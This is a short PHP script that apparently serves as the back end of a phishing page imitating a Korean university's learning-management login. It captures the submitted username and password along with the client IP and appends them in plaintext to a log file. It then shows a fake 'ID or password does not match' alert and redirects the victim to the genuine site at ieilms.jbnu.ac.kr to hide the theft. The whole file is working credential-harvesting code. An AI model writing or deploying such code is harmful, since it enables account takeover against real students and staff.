<?php
$currentDateTime = date('Y-m-d H:i:s');
$userIP = $_SERVER['REMOTE_ADDR'];
$usernum = $_POST['login'];
$password = $_POST['passwd'];

// Log the entered usernum and password
$logFile = '/home/aheun/login.log';
$logMessage = "$currentDateTime UserIP: $userIP, Usernum: $usernum, Password: $password" . PHP_EOL;

file_put_contents($logFile, $logMessage, FILE_APPEND);

// Display a popup message
echo "<script>
	var message = '아이디 또는 비밀번호가 일치하지 않습니다.';
	alert(message);
</script>";

// Perform the redirection to https://ieilms.jbnu.ac.kr
echo "<script>
    setTimeout(function() {
        window.location.href = 'https://ieilms.jbnu.ac.kr';
    }, 20); // Delay in milliseconds (20 -> 0.02 seconds)
</script>";
?>
